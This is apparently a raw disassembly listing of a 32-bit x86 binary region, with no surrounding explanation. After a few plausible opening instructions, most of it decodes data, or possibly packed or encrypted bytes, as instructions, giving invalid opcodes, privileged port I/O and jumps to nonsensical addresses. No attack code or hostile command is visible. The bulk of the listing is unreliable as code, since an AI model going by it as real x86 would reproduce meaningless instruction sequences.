  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [esi+0x62b20a24],ah
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x18744385],1
  41d522:	cmp    al,ch
  41d524:	call   0xf4e2:0xbcfa47e2
  41d52b:	mov    ch,BYTE PTR [eax-0x128caf33]
  41d531:	xchg   ecx,eax
  41d532:	ds push ebx
  41d534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d535:	daa    
  41d536:	not    dl
  41d538:	xchg   esi,eax
  41d539:	fs mov ch,0x30
  41d53c:	in     al,dx
  41d53d:	lds    ebp,FWORD PTR [ebx]
  41d53f:	sbb    edx,DWORD PTR [edx]
  41d541:	test   al,0x4f
  41d543:	or     ebx,edx
  41d545:	adc    al,0x5d
  41d547:	xor    ecx,ecx
  41d549:	rcl    DWORD PTR [edi],1
  41d54b:	add    BYTE PTR [ebx],ah
  41d54d:	jnp    0x41d57c
  41d54f:	jb     0x41d5b5
  41d551:	rol    esp,cl
  41d553:	cmp    BYTE PTR [eax+0x16],bh
  41d556:	pushf  
  41d557:	test   BYTE PTR [eax],dl
  41d559:	dec    ebx
  41d55a:	clc    
  41d55b:	xchg   ecx,eax
  41d55c:	mov    ah,0x6c
  41d55e:	xchg   edi,eax
  41d55f:	rcl    BYTE PTR [edx+0x3a],cl
  41d562:	mov    eax,ds:0x77bb52d
  41d567:	in     al,dx
  41d568:	xor    eax,0x8f3f6cc2
  41d56d:	dec    esp
  41d56e:	jbe    0x41d5d6
  41d570:	sub    al,0x5c
  41d572:	in     al,0x37
  41d574:	xchg   ebp,eax
  41d575:	jecxz  0x41d50b
  41d577:	les    esp,FWORD PTR [ecx-0x51]
  41d57a:	add    BYTE PTR [esi+edi*8],cl
  41d57d:	daa    
  41d57e:	push   edx
  41d57f:	lea    edx,[edx+edi*4-0x58a88f58]
  41d586:	iret   
  41d587:	sahf   
  41d588:	shl    ebp,cl
  41d58a:	xchg   ebp,eax
  41d58b:	xor    al,0x87
  41d58d:	pop    ebx
  41d58e:	mov    edx,DWORD PTR [edx+0x2ca7a578]
  41d594:	addr16 mov esp,0x21b6971e
  41d59a:	push   ebp
  41d59b:	outs   dx,DWORD PTR cs:[esi]
  41d59d:	mov    ah,0x1b
  41d59f:	dec    edi
  41d5a0:	adc    eax,0x91df0dcc
  41d5a5:	inc    esp
  41d5a6:	xchg   ebx,eax
  41d5a7:	add    bh,BYTE PTR [edx]
  41d5a9:	push   ecx
  41d5aa:	dec    dx
  41d5ac:	aas    
  41d5ad:	lds    esp,FWORD PTR [ebx+0x321c0604]
  41d5b3:	xor    al,0x1a
  41d5b5:	scas   eax,DWORD PTR es:[edi]
  41d5b6:	call   0x11925e24
  41d5bb:	and    BYTE PTR [esi-0x5c],0xf9
  41d5bf:	int3   
  41d5c0:	xchg   DWORD PTR [edx+0x14],esi
  41d5c3:	ss loop 0x41d5b7
  41d5c6:	lea    edi,[eax+0xc043793]
  41d5cc:	lods   eax,DWORD PTR ds:[esi]
  41d5cd:	mov    dh,0xd1
  41d5cf:	cmc    
  41d5d0:	fstp   DWORD PTR [esi]
  41d5d2:	(bad)  
  41d5d3:	pop    ecx
  41d5d4:	test   al,0xf9
  41d5d6:	(bad)  
  41d5d7:	in     al,0x41
  41d5d9:	ins    BYTE PTR es:[edi],dx
  41d5da:	jmp    0x41d5bc
  41d5dc:	inc    ebx
  41d5dd:	jno    0x41d618
  41d5df:	jbe    0x41d627
  41d5e1:	push   edi
  41d5e2:	sahf   
  41d5e3:	push   ss
  41d5e4:	push   0xffffffc4
  41d5e6:	xchg   DWORD PTR [esi+0x8],ebx
  41d5e9:	imul   esp,DWORD PTR [ebx],0xffffffcf
  41d5ec:	(bad)  
  41d5ed:	fcmovbe st,st(5)
  41d5ef:	cmp    al,BYTE PTR [esp+edi*1]
  41d5f2:	loope  0x41d5c4
  41d5f4:	sbb    al,0x40
  41d5f6:	push   eax
  41d5f7:	loope  0x41d598
  41d5f9:	cmp    DWORD PTR [ebp-0x75],ebp
  41d5fc:	mov    ch,0x28
  41d5fe:	and    ah,cl
  41d600:	mov    ?,WORD PTR [ebx]
  41d602:	push   0x23
  41d604:	push   edx
  41d605:	sbb    cl,0xc
  41d608:	stc    
  41d609:	dec    ebp
  41d60a:	mov    eax,ds:0xc62c5c27
  41d60f:	out    0x8c,eax
  41d611:	push   es
  41d612:	jno    0x41d594
  41d614:	sti    
  41d615:	int3   
  41d616:	xchg   sp,ax
  41d618:	sbb    BYTE PTR [ebp+0x53731707],0xe7
  41d61f:	add    al,BYTE PTR [eax]
  41d621:	sub    BYTE PTR [edx+ecx*1+0x54],ah
  41d625:	xor    al,0xe1
  41d627:	or     DWORD PTR [ecx],edi
  41d629:	outs   dx,DWORD PTR ds:[esi]
  41d62a:	ins    DWORD PTR es:[edi],dx
  41d62b:	and    cl,bh
  41d62d:	mov    ds:0x82269088,al
  41d632:	fld    QWORD PTR [ecx+0x4626bdda]
  41d638:	jle    0x41d677
  41d63a:	sti    
  41d63b:	ret    
  41d63c:	mov    bl,0x22
  41d63e:	in     eax,dx
  41d63f:	sbb    eax,0xbedf96c8
  41d644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d645:	imul   ecx,DWORD PTR [ecx-0x33],0xffffffc7
  41d649:	cdq    
  41d64a:	jp     0x41d695
  41d64c:	popf   
  41d64d:	mov    eax,ds:0xdc9a7b60
  41d652:	xchg   ebp,eax
  41d653:	je     0x41d5f6
  41d655:	xchg   edi,eax
  41d656:	sbb    eax,0x67edfa58
  41d65b:	jne    0x41d624
  41d65d:	push   edx
  41d65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d65f:	ret    
  41d660:	aas    
  41d661:	add    BYTE PTR [ebp+0x1e0e2b24],al
  41d667:	mov    al,ds:0x31e0a53d
  41d66c:	push   ebx
  41d66d:	add    eax,0x791b7f8b
  41d672:	cmp    bh,BYTE PTR [ecx+0x68]
  41d675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d676:	sbb    DWORD PTR [eax],edi
  41d678:	retf   0xb18d
  41d67b:	or     BYTE PTR [ebp+edi*4+0x6f],ah
  41d67f:	imul   ebp,ebp,0xffffffb4
  41d682:	dec    esp
  41d683:	rcl    BYTE PTR [eax+ecx*1],0x23
  41d687:	push   eax
  41d688:	mov    esi,ds
  41d68a:	mov    BYTE PTR [eax-0x73414891],ch
  41d690:	jecxz  0x41d66a
  41d692:	loopne 0x41d6d9
  41d694:	dec    ecx
  41d695:	loopne 0x41d61a
  41d697:	pop    eax
  41d698:	lock bound ebx,QWORD PTR [edi]
  41d69b:	out    dx,al
  41d69c:	js     0x41d6bd
  41d69e:	inc    esp
  41d69f:	out    0x6c,al
  41d6a1:	scas   al,BYTE PTR es:[edi]
  41d6a2:	xor    al,0x49
  41d6a4:	fdiv   st(5),st
  41d6a6:	jne    0x41d6d3
  41d6a8:	enter  0xf0a8,0x70
  41d6ac:	loope  0x41d650
  41d6ae:	mov    BYTE PTR [eax],0x9a
  41d6b1:	adc    cl,BYTE PTR [esi]
  41d6b3:	push   ds
  41d6b4:	add    BYTE PTR [ebx+0x67],0xe3
  41d6b8:	sbb    al,0x23
  41d6ba:	stos   BYTE PTR es:[edi],al
  41d6bb:	retf   0x2376
  41d6be:	mov    eax,ds:0xf9779ec3
  41d6c3:	dec    esi
  41d6c4:	and    BYTE PTR [eax+0x74f5f50f],ch
  41d6ca:	jle    0x41d71d
  41d6cc:	icebp  
  41d6cd:	mov    edx,0x376c93c3
  41d6d2:	cmp    BYTE PTR [esp+esi*2],bh
  41d6d5:	jbe    0x41d6be
  41d6d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6d8:	sbb    esp,DWORD PTR [edx]
  41d6da:	cmp    BYTE PTR [esi+0x65a95b41],dl
  41d6e0:	imul   esp,DWORD PTR [eax-0x67],0x7f
  41d6e4:	dec    ebx
  41d6e5:	repnz test eax,0x4f696264
  41d6eb:	iret   
  41d6ec:	rcr    dl,1
  41d6ee:	dec    esi
  41d6ef:	into   
  41d6f0:	outs   dx,DWORD PTR ds:[esi]
  41d6f1:	in     eax,0x8
  41d6f3:	stos   BYTE PTR es:[edi],al
  41d6f4:	or     esp,DWORD PTR [edx-0x27]
  41d6f7:	and    al,0x94
  41d6f9:	cld    
  41d6fa:	dec    edi
  41d6fb:	sub    edi,DWORD PTR [eax]
  41d6fd:	cmp    cl,BYTE PTR [edx]
  41d6ff:	or     edi,DWORD PTR [ebx]
  41d701:	dec    eax
  41d702:	rol    DWORD PTR [edi-0x5c],1
  41d705:	shl    BYTE PTR [eax-0x686f9d5e],cl
  41d70b:	enter  0x9d14,0xe8
  41d70f:	iret   
  41d710:	fstp   DWORD PTR [ecx+0x75142cc5]
  41d716:	cmc    
  41d717:	mov    ecx,0x10d0e219
  41d71c:	aam    0x3e
  41d71e:	jp     0x41d6c7
  41d720:	cmc    
  41d721:	fistp  QWORD PTR [ebx-0xde73445]
  41d727:	rcr    DWORD PTR [ebx-0x4d],cl
  41d72a:	popa   
  41d72b:	cdq    
  41d72c:	out    0xe0,al
  41d72e:	ja     0x41d6c4
  41d730:	sahf   
  41d731:	xchg   ebx,eax
  41d732:	out    dx,al
  41d733:	aam    0x2
  41d735:	lahf   
  41d736:	(bad)  [ebx-0x242ec0bc]
  41d73c:	out    dx,al
  41d73d:	js     0x41d6f9
  41d73f:	inc    eax
  41d740:	pusha  
  41d741:	or     al,0xaa
  41d743:	xchg   edx,eax
  41d744:	bswap  esp
  41d746:	dec    edi
  41d747:	out    dx,eax
  41d748:	cmp    BYTE PTR [ecx+0x1980d8ad],dh
  41d74e:	popa   
  41d74f:	cmc    
  41d750:	imul   ecx,edi,0xa3d9c37a
  41d756:	pop    edx
  41d757:	inc    eax
  41d758:	sub    al,0xbf
  41d75a:	pop    esp
  41d75b:	add    al,0x9a
  41d75d:	pop    es
  41d75e:	lods   al,BYTE PTR ds:[esi]
  41d760:	aam    0xfc
  41d762:	and    BYTE PTR [ecx-0x465073bc],dl
  41d768:	jbe    0x41d7b3
  41d76a:	and    eax,0x5385df66
  41d76f:	mov    al,0xdb
  41d771:	jmp    DWORD PTR [ecx]
  41d774:	sti    
  41d775:	mov    al,ds:0x5537c109
  41d77a:	scas   eax,DWORD PTR es:[edi]
  41d77b:	outs   dx,DWORD PTR ds:[esi]
  41d77c:	push   eax
  41d77d:	or     DWORD PTR [eax+0x3c],0x76
  41d781:	jl     0xec2b351f
  41d787:	adc    DWORD PTR [edx-0x32],0x78340c22
  41d78e:	(bad)  
  41d790:	pop    ebp
  41d791:	xor    al,0x7a
  41d793:	pop    ebx
  41d794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d795:	mov    DWORD PTR [ecx+0x6f7545a4],edx
  41d79b:	out    0xa3,al
  41d79d:	jns    0x41d728
  41d79f:	mov    ds:0xc1ca5624,al
  41d7a4:	addr16 sbb al,0xac
  41d7a7:	test   eax,0x8144e899
  41d7ac:	push   ebp
  41d7ad:	adc    eax,0xd4078b09
  41d7b2:	pop    esp
  41d7b3:	mov    al,ds:0xce0cd87d
  41d7b8:	mov    ?,WORD PTR [edx+0x1fd7f74e]
  41d7be:	ret    0xc984
  41d7c1:	inc    esi
  41d7c2:	mov    bh,0xbe
  41d7c4:	sub    ch,BYTE PTR [esp+eax*8]
  41d7c7:	int    0x6a
  41d7c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ca:	inc    edi
  41d7cb:	jbe    0x41d839
  41d7cd:	push   edi
  41d7ce:	nop
  41d7cf:	daa    
  41d7d0:	in     al,0x9f
  41d7d2:	mov    edi,0x93046292
  41d7d7:	clc    
  41d7d8:	lock pop esi
  41d7da:	pop    edi
  41d7db:	imul   DWORD PTR [edi]
  41d7dd:	add    DWORD PTR [esp+ebp*1],ebp
  41d7e0:	push   es
  41d7e1:	or     dl,bh
  41d7e3:	xchg   ebx,eax
  41d7e4:	jmp    0x41d7a7
  41d7e6:	inc    edx
  41d7e7:	push   esp
  41d7e8:	enter  0x5d69,0xd1
  41d7ec:	shl    BYTE PTR [ebx],cl
  41d7ee:	jnp    0x41d795
  41d7f0:	aad    0xde
  41d7f2:	std    
  41d7f3:	adc    ebx,DWORD PTR [edx]
  41d7f5:	outs   dx,DWORD PTR ds:[esi]
  41d7f6:	mov    al,ds:0xf2c615db
  41d7fb:	jp     0x41d77d
  41d7fd:	or     BYTE PTR [ebp+0x79ad0534],ah
  41d803:	mov    bl,0xfe
  41d805:	(bad)  
  41d806:	out    0x6,eax
  41d808:	loop   0x41d7c1
  41d80a:	dec    ebx
  41d80b:	pop    edx
  41d80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d80d:	mov    cl,0xad
  41d80f:	daa    
  41d810:	(bad)  [ebx]
  41d812:	push   cs
  41d813:	ins    BYTE PTR es:[edi],dx
  41d814:	add    al,0x59
  41d816:	mov    esi,0xd2b50d07
  41d81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d81c:	scas   eax,DWORD PTR es:[edi]
  41d81d:	repnz inc ebx
  41d81f:	int    0xb1
  41d821:	dec    edx
  41d822:	rcl    DWORD PTR [ecx],0x61
  41d825:	(bad)  
  41d826:	fcomp  DWORD PTR [edi+0x6a37af77]
  41d82c:	popf   
  41d82d:	or     eax,0xdab22e48
  41d832:	pop    DWORD PTR [esi]
  41d834:	scas   al,BYTE PTR es:[edi]
  41d835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d836:	out    dx,eax
  41d837:	cmc    
  41d838:	xlat   BYTE PTR ds:[ebx]
  41d839:	pop    esi
  41d83a:	loope  0x41d848
  41d83c:	outs   dx,DWORD PTR ds:[esi]
  41d83d:	push   0x2a1ddb5e
  41d842:	jns    0x41d7f5
  41d844:	inc    edx
  41d845:	jl     0x41d7e7
  41d847:	jp     0x41d7d1
  41d849:	fmul   DWORD PTR ds:0x9bcee012
  41d84f:	scas   eax,DWORD PTR es:[edi]
  41d850:	mov    eax,0x862fce28
  41d855:	(bad)  
  41d856:	push   eax
  41d857:	fcom   QWORD PTR [edx+0x62]
  41d85a:	mov    edx,?
  41d85c:	out    dx,al
  41d85d:	add    eax,0xcc28f0a0
  41d862:	pop    ds
  41d863:	xchg   BYTE PTR [edi+esi*2-0x364d0b18],al
  41d86a:	ins    DWORD PTR es:[edi],dx
  41d86b:	mov    esi,0x440fbafa
  41d870:	dec    ebp
  41d871:	rol    DWORD PTR [ebx-0xc],cl
  41d874:	dec    ecx
  41d875:	pop    ss
  41d876:	lods   eax,DWORD PTR ds:[si]
  41d878:	retf   
  41d879:	xchg   ebp,eax
  41d87a:	mov    ds:0xc988ca8,al
  41d87f:	push   ebx
  41d880:	push   eax
  41d881:	push   ebp
  41d882:	add    DWORD PTR [edi+edx*1],ebx
  41d885:	cmp    al,0x44
  41d887:	xchg   ecx,eax
  41d888:	xchg   esi,eax
  41d889:	or     al,BYTE PTR [edx+0x66]
  41d88c:	xlat   BYTE PTR ds:[ebx]
  41d88d:	out    0x99,eax
  41d88f:	and    eax,DWORD PTR [ebx+0x79]
  41d892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d893:	mov    ds:0x1d2e85a1,al
  41d898:	cmp    DWORD PTR [ebx],esi
  41d89a:	or     dh,dl
  41d89c:	fistp  WORD PTR [edi+0x1098796d]
  41d8a2:	test   al,0x18
  41d8a4:	mov    BYTE PTR [ecx+0x1d],ah
  41d8a7:	jb     0x41d875
  41d8a9:	retf   0xb125
  41d8ac:	xor    esi,edx
  41d8ae:	mov    ds:0x6cf0369c,eax
  41d8b3:	lds    esi,FWORD PTR [ecx-0x70bdf1e5]
  41d8b9:	adc    DWORD PTR [eax+0x54],edi
  41d8bc:	xchg   ebp,eax
  41d8bd:	cmp    ch,BYTE PTR [ebx-0xbd12bec]
  41d8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8c4:	sub    cl,BYTE PTR [eax]
  41d8c6:	cmp    dh,BYTE PTR [edi+0x5047cb7b]
  41d8cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8cd:	add    ch,BYTE PTR [edi+0x3]
  41d8d0:	test   BYTE PTR [edx-0x57b7f35a],dh
  41d8d6:	push   esp
  41d8d7:	out    dx,al
  41d8d8:	scas   eax,DWORD PTR es:[edi]
  41d8d9:	sti    
  41d8da:	fdiv   QWORD PTR [ebx]
  41d8dc:	(bad)  
  41d8dd:	in     al,0xd7
  41d8df:	dec    esp
  41d8e0:	or     eax,0xf58b28d
  41d8e5:	cdq    
  41d8e6:	inc    ebp
  41d8e7:	cli    
  41d8e8:	pop    edi
  41d8e9:	cmp    ebx,DWORD PTR [eax+0x5025bf20]
  41d8ef:	sub    DWORD PTR [eax-0xa12b123],ebp
  41d8f5:	js     0x41d91e
  41d8f7:	jmp    0x2e69e709
  41d8fc:	lea    eax,[edi+0x5722883a]
  41d902:	cld    
  41d903:	or     eax,0x4c8c2888
  41d908:	jl     0x41d96f
  41d90a:	out    dx,eax
  41d90b:	cmc    
  41d90c:	sub    eax,0x45ca99f6
  41d911:	das    
  41d912:	cmp    eax,DWORD PTR [edi]
  41d914:	bound  ecx,QWORD PTR [edx-0x5b099c71]
  41d91a:	jo     0x41d90e
  41d91c:	add    BYTE PTR [edx-0x390c2a3a],dh
  41d922:	lock or eax,0x4e69f4c3
  41d928:	inc    edx
  41d929:	test   BYTE PTR [esi-0x5820743e],ah
  41d92f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41d931:	xor    al,0xf9
  41d933:	add    BYTE PTR [eax-0x34131649],bh
  41d939:	xchg   ebp,eax
  41d93a:	and    al,0x5b
  41d93c:	inc    esp
  41d93d:	push   ecx
  41d93e:	cs push cx
  41d941:	call   0xd0bd:0x56b7ce79
  41d948:	jecxz  0x41d955
  41d94a:	jne    0x41d994
  41d94c:	test   al,0x97
  41d94e:	int    0xe7
  41d950:	add    dh,0x5e
  41d953:	and    DWORD PTR [ebx],eax
  41d955:	enter  0xb134,0x53
  41d959:	jg     0x41d965
  41d95b:	push   edi
  41d95c:	add    ebx,DWORD PTR [edx-0x74409830]
  41d962:	jge    0x41d9aa
  41d964:	sub    DWORD PTR [ebx-0x65cc8f3e],0x37
  41d96b:	enter  0x2f9e,0xb4
  41d96f:	xchg   BYTE PTR [ebp+0x7d],al
  41d972:	das    
  41d973:	adc    al,0x8
  41d975:	rcl    BYTE PTR [ebx-0x54],1
  41d978:	sub    eax,0x3d0b208d
  41d97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d97e:	aad    0xa0
  41d980:	shl    BYTE PTR [ebx-0x2d7f227],cl
  41d986:	mov    eax,ds:0xf74cdd67
  41d98b:	scas   al,BYTE PTR es:[edi]
  41d98c:	repz push esi
  41d98e:	std    
  41d98f:	dec    esp
  41d990:	js     0x41d9ab
  41d992:	or     BYTE PTR [edi],al
  41d994:	xor    bh,BYTE PTR [ebx+0x3e]
  41d997:	imul   BYTE PTR [ecx+0x2b]
  41d99a:	inc    edi
  41d99b:	dec    edi
  41d99c:	add    eax,0x11ebe893
  41d9a1:	lahf   
  41d9a2:	ror    BYTE PTR [eax+eax*8],0x2c
  41d9a6:	dec    ebp
  41d9a7:	mov    dl,0x3f
  41d9a9:	inc    ebp
  41d9aa:	ffree  st(4)
  41d9ac:	xchg   ch,cl
  41d9ae:	daa    
  41d9af:	fs scas eax,DWORD PTR es:[edi]
  41d9b1:	mov    al,ds:0x6acccc5c
  41d9b6:	hlt    
  41d9b7:	ins    BYTE PTR es:[edi],dx
  41d9b8:	mov    ah,BYTE PTR [eax-0x51456503]
  41d9be:	and    DWORD PTR [ecx-0x7331f922],esp
  41d9c4:	in     eax,dx
  41d9c5:	cld    
  41d9c6:	or     BYTE PTR [esi+0x39b80526],dh
  41d9cc:	sbb    eax,0xaf4dd9a8
  41d9d1:	push   eax
  41d9d2:	icebp  
  41d9d3:	loope  0x41d9b7
  41d9d5:	test   eax,0xf568f544
  41d9da:	add    bh,cl
  41d9dc:	lea    ecx,[ecx+0x2bea9bd7]
  41d9e2:	mov    esp,0x4bd40f37
  41d9e7:	push   eax
  41d9e8:	shr    ebp,1
  41d9ea:	cwde   
  41d9eb:	stos   BYTE PTR es:[edi],al
  41d9ec:	loope  0x41d9ad
  41d9ee:	fild   QWORD PTR [edi+0x3]
  41d9f1:	adc    DWORD PTR [ebx-0x37],ebp
  41d9f4:	call   0x4f86:0xdefae731
  41d9fb:	aam    0xcc
  41d9fd:	syscall 
  41d9ff:	mov    edx,0x7d48df43
  41da04:	arpl   WORD PTR [eax+0x58],sp
  41da07:	sub    eax,0xe7dd6d66
  41da0c:	jl     0x41d9fe
  41da0e:	stc    
  41da0f:	int    0x1f
  41da11:	iret   
  41da12:	jmp    0x61e982f
  41da17:	mov    edi,0x79d69022
  41da1c:	adc    BYTE PTR [bx+di-0x3ec1],0xa6
  41da22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da23:	test   eax,0x8617a501
  41da28:	rol    DWORD PTR [esi+0x6e18b1a3],0xfd
  41da2f:	fisubr WORD PTR [eax-0x65810483]
  41da35:	mov    ds:0xaa1ea356,eax
  41da3a:	ds jg  0x41da82
  41da3d:	and    ebx,edx
  41da3f:	bound  edi,QWORD PTR [ebx+0x3d]
  41da42:	mov    ax,ds:0x2d98ed72
  41da48:	push   0xa6fc90e4
  41da4d:	mov    dl,BYTE PTR [esi+ebp*8-0x52]
  41da51:	jnp    0x41dab9
  41da53:	scas   al,BYTE PTR es:[edi]
  41da54:	jmp    0x2bfa:0xff05cd44
  41da5b:	push   edx
  41da5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da5d:	aaa    
  41da5e:	sub    al,0x88
  41da60:	gs cld 
  41da62:	fimul  DWORD PTR [ebx+0x77ff4c72]
  41da68:	or     edi,DWORD PTR [edx]
  41da6a:	dec    esp
  41da6b:	in     eax,0x8b
  41da6d:	or     DWORD PTR [edi-0x374a501c],eax
  41da73:	add    eax,0xb108d4df
  41da78:	out    0x3b,eax
  41da7a:	mov    edi,0xc17094ec
  41da7f:	adc    al,0x82
  41da81:	push   esp
  41da82:	jg     0x41da4c
  41da84:	repnz mov edi,0x6c708a4e
  41da8a:	mov    esi,0xbf3a7e16
  41da8f:	pusha  
  41da90:	mov    ebp,0xb4917613
  41da95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da96:	push   edi
  41da97:	mov    ebx,0x825ffb31
  41da9c:	pop    esp
  41da9d:	cmp    eax,0xdd620d53
  41daa2:	stos   BYTE PTR es:[edi],al
  41daa3:	loope  0x41da42
  41daa5:	or     ebp,DWORD PTR [esi]
  41daa7:	inc    esi
  41daa8:	scas   eax,DWORD PTR es:[edi]
  41daa9:	cli    
  41daaa:	test   BYTE PTR [edi+0x61],bl
  41daad:	es nop
  41daaf:	test   al,0x48
  41dab1:	jecxz  0x41dac1
  41dab3:	mov    ds:0xb544641c,al
  41dab8:	push   cs
  41dab9:	push   esi
  41daba:	das    
  41dabb:	out    dx,al
  41dabc:	or     al,BYTE PTR [ebx+eax*2+0x143110b5]
  41dac3:	stc    
  41dac4:	pop    esi
  41dac5:	iret   
  41dac6:	xor    DWORD PTR [ebp-0x1621860e],ebx
  41dacc:	or     DWORD PTR [ecx],0x7a
  41dacf:	add    DWORD PTR [ebx+0x6ebc1fe3],edx
  41dad5:	sbb    edi,DWORD PTR [ecx+0x3bb1e0a]
  41dadb:	xchg   DWORD PTR [esi],esp
  41dadd:	pop    ebx
  41dade:	pop    esp
  41dadf:	or     BYTE PTR [ecx+0x42],0xec
  41dae3:	push   ebx
  41dae4:	inc    edx
  41dae5:	std    
  41dae6:	and    ah,bl
  41dae8:	jbe    0x41dacd
  41daea:	lock and esp,DWORD PTR [ecx-0x4a]
  41daee:	lea    esi,[ebx]
  41daf0:	adc    bl,al
  41daf2:	das    
  41daf3:	dec    esi
  41daf4:	xor    BYTE PTR [edx-0x60],cl
  41daf7:	xor    ch,BYTE PTR [edx-0x14]
  41dafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafb:	xchg   BYTE PTR [esp+esi*8-0x7f43dc37],ah
  41db02:	jno    0x41db4d
  41db04:	xlat   BYTE PTR ds:[ebx]
  41db05:	popf   
  41db06:	out    0xe4,al
  41db08:	iret   
  41db09:	xor    edx,DWORD PTR [ebx-0x77029e4d]
  41db0f:	add    eax,0xae8ec49e
  41db14:	sbb    BYTE PTR [ebp-0x79],bh
  41db17:	ins    BYTE PTR es:[edi],dx
  41db18:	push   edx
  41db19:	push   0x12e45d2b
  41db1e:	jb     0x41dad7
  41db20:	sbb    eax,0x18930b81
  41db25:	push   ss
  41db26:	ja     0x41db7b
  41db28:	pop    eax
  41db29:	cmp    edi,DWORD PTR [edi+0x7bbd9b00]
  41db2f:	addr16 push esi
  41db31:	adc    edx,edx
  41db33:	outs   dx,DWORD PTR ds:[esi]
  41db34:	std    
  41db35:	enter  0x5edb,0x36
  41db39:	imul   eax,DWORD PTR [edi+0x3fd95402],0xffffffef
  41db40:	ins    DWORD PTR es:[edi],dx
  41db41:	inc    ebx
  41db42:	add    DWORD PTR [edi-0x450701d1],ebp
  41db48:	daa    
  41db49:	add    bh,ch
  41db4b:	mov    edi,0xb265a023
  41db50:	cmc    
  41db51:	pop    ds
  41db52:	clc    
  41db53:	(bad)  
  41db54:	loope  0x41db71
  41db56:	iret   
  41db57:	sub    BYTE PTR [ecx],bh
  41db59:	lahf   
  41db5a:	inc    eax
  41db5b:	inc    edx
  41db5c:	scas   al,BYTE PTR es:[edi]
  41db5d:	imul   edi,DWORD PTR [ecx-0x5b608057],0xffffffa3
  41db64:	or     edi,DWORD PTR [ebp+0x4af4c321]
  41db6a:	das    
  41db6b:	mov    ch,0xe2
  41db6d:	sbb    DWORD PTR [eax],0xf74450e7
  41db73:	cmp    ebx,ebp
  41db75:	push   esp
  41db76:	jbe    0x41dba9
  41db78:	test   al,0xaf
  41db7a:	out    dx,al
  41db7b:	mov    ebx,0x380ae580
  41db80:	xchg   ebp,eax
  41db81:	jmp    0x4ebd126
  41db86:	add    esi,DWORD PTR [edi-0xf]
  41db89:	pop    es
  41db8a:	xchg   edx,eax
  41db8b:	mov    eax,0x4b586d4a
  41db90:	(bad)
  41db93:	sbb    edx,DWORD PTR [edi-0x27c81d26]
  41db99:	push   esp
  41db9a:	js     0x41db7a
  41db9c:	mov    eax,ds:0xf97e1100
  41dba1:	sbb    BYTE PTR [edx+eax*2+0x71a95cc8],ch
  41dba8:	jge    0x41dc03
  41dbaa:	shl    BYTE PTR [edi],cl
  41dbac:	xchg   BYTE PTR [ebx],bl
  41dbae:	jb     0x41db30
  41dbb0:	aad    0x8
  41dbb2:	jmp    0x9c95:0x6e9545f3
  41dbb9:	leave  
  41dbba:	dec    ecx
  41dbbb:	adc    dh,BYTE PTR [ecx+0x8]
  41dbbe:	iret   
  41dbbf:	inc    edx
  41dbc0:	xchg   ebp,eax
  41dbc1:	inc    edi
  41dbc2:	imul   ebp,DWORD PTR [ebx],0x2a
  41dbc5:	push   ds
  41dbc6:	mov    ebx,0x531dec2d
  41dbcb:	pop    ebx
  41dbcc:	cmc    
  41dbcd:	and    bl,BYTE PTR [eax+0x4c1c79db]
  41dbd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbd4:	or     al,0x57
  41dbd6:	push   es
  41dbd7:	sbb    al,0x3c
  41dbd9:	xor    eax,eax
  41dbdb:	int    0x15
  41dbdd:	and    al,0x44
  41dbdf:	push   0xfffffff1
  41dbe1:	and    BYTE PTR [edi+edx*8-0x4],ch
  41dbe5:	ds xor al,0xf0
  41dbe8:	stos   BYTE PTR es:[edi],al
  41dbe9:	push   0x2d
  41dbeb:	call   0x82bf69c5
  41dbf0:	nop
  41dbf1:	push   cs
  41dbf2:	xchg   esi,eax
  41dbf3:	jle    0x41dc68
  41dbf5:	rcr    BYTE PTR [ebx+0x7d],cl
  41dbf8:	fsub   DWORD PTR [eax-0x67]
  41dbfb:	inc    ecx
  41dbfc:	shl    DWORD PTR [eax+0x5ab6b4f3],0xc3
  41dc03:	and    DWORD PTR [ebx+eax*8],edx
  41dc06:	xchg   DWORD PTR [ebx+0x41e60428],ebx
  41dc0c:	xor    BYTE PTR [ebp+0x6bc7fe92],cl
  41dc12:	lods   eax,DWORD PTR ds:[esi]
  41dc13:	loopne 0x41dbe2
  41dc15:	push   esp
  41dc16:	mov    ds:0xaef53f43,eax
  41dc1b:	test   edx,esp
  41dc1d:	or     ah,BYTE PTR [ebx+0x5d0d4e46]
  41dc23:	mov    bl,0x9b
  41dc25:	pop    ebx
  41dc26:	js     0x41dbfd
  41dc28:	sbb    bl,BYTE PTR [esp+eiz*8+0x3e]
  41dc2c:	scas   eax,DWORD PTR es:[edi]
